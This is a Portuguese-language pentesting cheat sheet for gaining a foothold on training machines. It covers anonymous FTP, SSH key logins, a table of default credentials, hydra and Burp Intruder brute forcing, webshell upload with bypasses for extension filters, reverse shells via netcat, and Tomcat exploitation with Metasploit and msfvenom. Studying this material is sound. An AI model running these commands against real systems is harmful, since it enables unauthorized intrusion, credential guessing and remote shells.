# Exploração / Conseguir acesso (foothold)

## FTP ANÔNIMO | login sem senha | anonymous | "será que abre sem pedir nada" (anonymous FTP login)

```
ftp <IP>
# usuário: anonymous, senha: em branco (ou qualquer coisa)
ls
get arquivo.txt
bye
```
- Porta 21 aberta → sempre testar anônimo primeiro, antes de qualquer força bruta.
- Achou arquivo de texto → pode ser wordlist de senha ou lista de usuário (ler antes de assumir).

## FTP — COMANDOS COMPLETOS DENTRO DA SESSÃO | uso geral do FTP | baixar tudo | mandar arquivo (FTP session commands)

```
ftp <IP>                    # conecta
nmap -p21 --script ftp-anon <IP>   # testa anônimo SEM precisar entrar manualmente (rápido, direto do terminal)
nc <IP> 21                  # pega o banner (versão) sem nem logar — só conectar já mostra a mensagem inicial

# dentro da sessão ftp (depois de logado):
ls                          # lista arquivos
cd pasta                    # entra em pasta
pwd                         # em que pasta eu tô no servidor
get arquivo                 # baixa 1 arquivo pro Kali
mget *                      # baixa TODOS os arquivos da pasta atual de uma vez
put arquivo                 # sobe 1 arquivo do Kali pro servidor (se tiver permissão de escrita)
binary                      # muda pro modo binário — usar SEMPRE antes de get/put de arquivo que não é .txt (imagem, .zip, executável), senão corrompe
prompt                      # desliga a confirmação "yes/no" antes de cada arquivo do mget (economiza tempo)
bye                         # sai
```
- **`binary` antes de baixar/subir qualquer coisa que não seja texto puro** — esquecer isso é causa comum de arquivo baixado vir corrompido/quebrado.
- Se o FTP permitir `put` (escrita) e a máquina também tiver site na mesma pasta → dá pra subir um webshell direto pelo FTP e acessar pela URL depois (mistura com a seção WEBSHELL abaixo).
- Buscar: `ftp client commands cheat sheet`, `ftp-anon nmap script`

## SSH — COMANDOS E USO | já tenho credencial, como entro | chave privada encontrada | erro de host key (SSH usage)

```
ssh usuario@<IP>                          # login normal com senha (pede a senha na hora)
ssh usuario@<IP> -p <porta>               # se o SSH não tá na porta padrão 22
ssh -i id_rsa usuario@<IP>                # login com CHAVE PRIVADA (achada via FTP/web/backup), não senha
chmod 600 id_rsa                          # obrigatório antes do -i acima — SSH recusa chave com permissão aberta demais
hydra -l usuario -P /usr/share/wordlists/dirb/common.txt ssh://<IP>   # força bruta rápida (wordlist pequena)
scp arquivo usuario@<IP>:/caminho/destino # copia arquivo do Kali PRO alvo via SSH
scp usuario@<IP>:/caminho/arquivo .       # copia arquivo DO alvo pro Kali (sentido invertido)
ssh-keygen -R <IP>                        # limpa host key antiga salva (usar se der erro "REMOTE HOST IDENTIFICATION HAS CHANGED")
```
- SSH raramente é o ponto de **entrada** — ele é onde você **usa** a credencial que já achou em outro lugar (FTP, site, arquivo de config). Ver porta 22 aberta não significa atacar ela primeiro.
- Se achar um arquivo `id_rsa` (chave privada) em qualquer lugar (FTP, backup, `.ssh/` de um user) → sempre tentar como login SSH antes de gastar tempo com senha.
- Erro "Permission denied (publickey)" com `-i` → conferir se rodou o `chmod 600` antes.
- Buscar: `ssh cheat sheet`, `ssh private key login`, `scp syntax`

## SÓ FTP/SSH ABERTO, SEM WEB, SEM CREDENCIAL | travei, não sei o próximo passo | anônimo não funcionou (no web, no known creds)

Ordem certa quando **não tem porta 80/443** (fuzzing de web não serve aqui) e o FTP anônimo falhou:

```
1. nmap -sV -sC -p21,22 <IP>        # pega a versão EXATA do serviço (ex: vsftpd 2.3.4, ProFTPd 1.3.5)
2. searchsploit <nome_e_versão>     # ex: searchsploit vsftpd 2.3.4 — verifica exploit/backdoor conhecido
3. searchsploit -m <caminho_do_exploit>   # copia o exploit encontrado pra pasta atual, pra ler/usar
4. Testar credenciais óbvias na mão: ftp:ftp | anonymous:anonymous | admin:admin | root:root | test:test
5. Só por último: hydra rápido (usuário fixo + wordlist pequena, nunca rockyou inteiro sob tempo de prova)
   hydra -l ftpuser -P /usr/share/wordlists/dirb/common.txt ftp://<IP>
```
- **Passo 2 é o que mais gente esquece.** A porta pode estar "aberta" mas o próprio programa que roda nela ter uma falha conhecida (backdoor) — não precisa achar senha de ninguém, é uma falha do software. Ex. clássico: `vsftpd 2.3.4` tem backdoor documentado que dá shell direto.
- Se achar credencial em QUALQUER lugar (FTP, site, arquivo) — **testa ela em todos os serviços abertos** (FTP, SSH, painel web). Reuso de senha entre serviços é o padrão mais comum nas máquinas de treino/prova.
- Buscar: `searchsploit usage`, `<nome do serviço> <versão> exploit`, `<nome do serviço> default credentials`

## CREDENCIAIS PADRÃO POR SERVIÇO | senha de fábrica | testar antes de força bruta (default credentials by service)

Testar SEMPRE antes de gobuster/ffuf/hydra pesado — é grátis e rápido:

| Serviço | Usuário | Senha |
| --- | --- | --- |
| FTP genérico | `ftp`, `anonymous` | `ftp`, em branco |
| SSH genérico | `root`, `admin`, `user` | igual ao usuário, `123456`, `password` |
| Tomcat Manager | `tomcat`, `admin` | `tomcat`, `s3cret`, `admin` |
| MySQL | `root` | em branco, `root`, `toor` |
| phpMyAdmin | `root` | em branco |
| SMB/Windows | `administrator`, `guest` | em branco, `Password1`, nome da empresa |
| Roteador/painel genérico | `admin` | `admin`, `password`, `1234` |
| Qualquer painel | nome do app em minúsculo | `nome_do_app123`, `changeme` |
- Buscar quando não achar aqui: `default credentials <nome_exato_do_serviço>` — quase todo software conhecido tem lista pública.
- Regra geral: senha "padrão de fábrica" quase sempre é o **nome do serviço**, `admin`, `password`, ou variação simples — testar essas 4-5 combinações leva segundos e resolve muita máquina de treino/prova.

## BURP SUITE — PASSO A PASSO | interceptar requisição | testar login manualmente | fuzzing visual (Burp Suite walkthrough)

Ferramenta com interface gráfica (já vem no Kali) pra ver e editar o que o navegador manda pro servidor **antes** de sair — útil pra testar login, achar campo escondido, ou fuzzar visualmente em vez de linha de comando.

```
1. Abrir "Burp Suite" (Community Edition) no menu do Kali
2. Na tela inicial: "Next" → "Start Burp" (usar configuração padrão / Temporary project)
3. Ir na aba "Proxy" → sub-aba "Intercept" → clicar "Intercept is on" (fica azul/ligado)
4. Abrir o navegador EMBUTIDO do Burp (aba "Proxy" → botão "Open browser") — já vem configurado, não precisa mexer em proxy manual
5. No navegador do Burp, ir até a página de login do alvo, digitar qualquer usuário/senha de teste, clicar em Entrar
6. A requisição fica "presa" na aba Intercept — dá pra ver TODOS os campos exatos que o formulário manda (às vezes tem campo escondido que o HTML normal não mostra)
```

**Depois de capturar a requisição, dois caminhos:**

**A) Testar manualmente (Repeater)** — mudar um campo por vez e reenviar, ver a resposta:
```
Botão direito na requisição capturada → "Send to Repeater"
Na aba Repeater: editar o campo (ex: trocar a senha) → botão "Send" → ver resposta do lado direito
```

**B) Fuzzing automático (Intruder)** — testar uma wordlist inteira, igual o `ffuf`, mas visual:
```
Botão direito na requisição capturada → "Send to Intruder"
Na aba Intruder → sub-aba "Positions": selecionar o valor que quer testar (ex: a senha) → clicar "Add §" nos dois lados dele (marca o campo)
Sub-aba "Payloads": botão "Load" → escolher a wordlist (ex: seclists top-1000)
Botão "Start attack" (canto superior direito)
```
- Resultado mostra uma **tabela** com cada tentativa + código de status + tamanho da resposta — a linha **diferente das outras** (status ou tamanho fora do padrão) é a senha/usuário certo.
- Community Edition (grátis) do Intruder é mais lento que a versão paga — pra wordlist grande, prefira `ffuf`/`hydra` por linha de comando; Burp Intruder vale mais pra wordlist pequena ou quando quer **ver visualmente** cada tentativa.
- Desligar "Intercept is on" depois de terminar, senão toda navegação normal fica travada esperando você liberar manualmente.
- Buscar: `burp suite intruder tutorial`, `burp suite intercept basics`

## FORÇA BRUTA DE LOGIN | hydra | chutar senha | tentar várias senhas até acertar (brute force login)

```
hydra -l usuario -P senhas.txt <IP> ssh              # 1 usuário fixo + wordlist de senha
hydra -L usuarios.txt -P senhas.txt <IP> ftp          # wordlist de usuário E senha
hydra -l admin -P senhas.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=mensagem_de_erro"
```
- **Nunca é o primeiro passo** — só depois de já ter usuário certo ou wordlist plausível (FTP anônimo, código-fonte, etc.).
- Pro `http-post-form`: antes de rodar, ver o código-fonte (Ctrl+U) do formulário pra pegar o nome exato dos campos e a mensagem de erro exibida no login errado.
- Buscar: `hydra http-post-form syntax`, `hydra cheat sheet`

## LOGIN WEB / CREDENCIAL PADRÃO | painel admin | tela de login sem usuário conhecido (default credentials)

- Antes de forçar: ver código-fonte da página (`Ctrl+U`), procurar comentário tipo `<!-- TODO -->` ou credencial esquecida.
- Testar credencial padrão do serviço (`admin`/`admin`, `admin`/senha do nome do app) antes de ir pro hydra.
- Achou wordlist em outro serviço (FTP/SMB) → testar ela no login web também.

## WEBSHELL / UPLOAD MALICIOSO | subir arquivo pra ganhar shell | bypass de extensão (malicious file upload)

- Ideia: painel permite upload de arquivo → sobe um script que executa comando do sistema quando a página é acessada → passa o comando via parâmetro da URL (algo como `arquivo.php?cmd=whoami`).
- Se o filtro bloquear a extensão `.php`: tentar dupla extensão (`arquivo.php.jpg`), extensão alternativa que o servidor ainda interpreta (`.phtml`, `.php5`), ou trocar o `Content-Type` enviado no upload.
- Gerador pronto (evita digitar payload na mão): **PayloadsAllTheThings** no GitHub, seção web shells.
- Buscar: `php webshell upload bypass extension filter`, `payloadsallthethings web shell`

## REVERSE SHELL | shell reverso | netcat | "o alvo liga de volta pra mim" (reverse shell)

- Mecanismo: eu deixo o Kali **escutando** numa porta (`nc -lvnp <porta>`), e disparo no alvo um comando que abre conexão de volta pro **meu IP** (não o do alvo!) nessa porta — aí o terminal que abre é do alvo.
- Gerador pronto (não decorar sintaxe na mão, evita erro de digitação sob pressão): **revshells.com** — escolher linguagem disponível no alvo (bash/php/python/etc), colar IP do Kali + porta, copiar.
- Erro clássico: confundir IP do Kali com IP do alvo no payload — é sempre o **seu** IP que entra ali.
- Buscar: `revshells.com`, `reverse shell cheat sheet <linguagem>`

## TOMCAT | porta 8080 | painel de gerenciamento Java | manager/html (Apache Tomcat manager exploitation)

```
msfconsole
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>
run
```
- Módulo do Metasploit acha credencial do Tomcat Manager com wordlist interna — mais rápido que hydra manual.
- Depois de logar em `/manager/html`: seção **Deploy** aceita upload de `.war` → gerar payload com `msfvenom -p php/reverse_php LHOST=<IP_kali> LPORT=<porta> -f raw > shell.php` (ou payload `.war` equivalente) → subir → acessar pela URL.
- Ver a página do manager em `http://<IP>:8080/manager/html`.
- Buscar: `tomcat_mgr_login metasploit`, `msfvenom war payload`

## METASPLOIT | msfconsole | módulo pronto pra exploit (Metasploit framework)

```
msfconsole
search <nome_do_serviço>
use <módulo>
show options
set RHOSTS <IP>
set LHOST <IP_kali>
run
```
- `search` primeiro sempre que reconhecer um serviço específico (Tomcat, FTP, SMB) — geralmente já existe módulo pronto.
- Buscar: `metasploit <serviço> module`
